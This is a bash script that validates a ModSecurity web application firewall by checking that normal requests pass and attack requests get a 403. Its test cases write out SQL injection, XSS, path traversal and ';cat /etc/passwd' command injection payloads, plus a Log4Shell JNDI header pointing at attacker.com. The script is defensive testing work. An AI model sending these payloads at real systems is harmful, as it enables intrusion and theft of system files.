#!/usr/bin/env bash
# test-waf.sh — Validate WAF behaviour with normal and malicious requests
#
# Requires the WAF container to be running:
#   cd scripts/waf && docker compose up -d
#
# Usage:
#   ./test-waf.sh [WAF_URL]
#   WAF_URL defaults to http://localhost:8080

set -euo pipefail

WAF="${1:-http://localhost:8080}"
PASS=0
FAIL=0

# ------------------------------------------------------------------
check() {
  local desc="$1"
  local expected_http="$2"   # e.g. "403" or "200|302"
  local actual_http="$3"

  if echo "${actual_http}" | grep -qE "^(${expected_http})$"; then
    echo "  PASS  [${actual_http}] ${desc}"
    PASS=$((PASS + 1))
  else
    echo "  FAIL  [${actual_http}] ${desc}  (expected: ${expected_http})"
    FAIL=$((FAIL + 1))
  fi
}
# ------------------------------------------------------------------

echo "=== WAF Validation ==="
echo "Target: ${WAF}"
echo ""

# ── Normal requests (should NOT be blocked) ──────────────────────
echo "--- Normal requests (expect 200 or 302) ---"

code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${WAF}/")
check "GET /  — home page" "200|302" "${code}"

code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${WAF}/user/login")
check "GET /user/login — login page" "200|302" "${code}"

code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  -H "User-Agent: Mozilla/5.0 (compatible; test)" \
  "${WAF}/user/login")
check "GET /user/login — normal User-Agent" "200|302" "${code}"

echo ""

# ── Attack requests (should be blocked → 403) ─────────────────────
echo "--- Attack requests (expect 403 from ModSecurity) ---"

# SQL injection in query string
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  "${WAF}/user/login?q=1%27+OR+%271%27%3D%271")
check "SQL injection in query (?q=1' OR '1'='1)" "403" "${code}"

# XSS in query string
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  "${WAF}/search?q=<script>alert(1)</script>")
check "XSS in query (?q=<script>...)" "403" "${code}"

# Path traversal
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  "${WAF}/repo/../../../../etc/passwd")
check "Path traversal (/../../../etc/passwd)" "403" "${code}"

# Remote code execution pattern
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  "${WAF}/search?q=%3Bcat+/etc/passwd")
check "Command injection (;cat /etc/passwd)" "403" "${code}"

# Scanner-like User-Agent (sqlmap)
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  -H "User-Agent: sqlmap/1.0" \
  "${WAF}/")
check "Known scanner UA (sqlmap)" "403" "${code}"

# Log4Shell pattern
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  -H "X-Api-Version: \${jndi:ldap://attacker.com/a}" \
  "${WAF}/")
check "Log4Shell header injection" "403" "${code}"

echo ""
echo "=== Results: ${PASS} passed, ${FAIL} failed ==="

if [ "${FAIL}" -gt 0 ]; then
  echo ""
  echo "Tip: Check ModSecurity audit log with:"
  echo "  docker compose -f $(dirname "$0")/docker-compose.yml logs waf | grep -i 'ModSecurity\|blocked\|403'"
fi

[ "${FAIL}" -eq 0 ] && exit 0 || exit 1
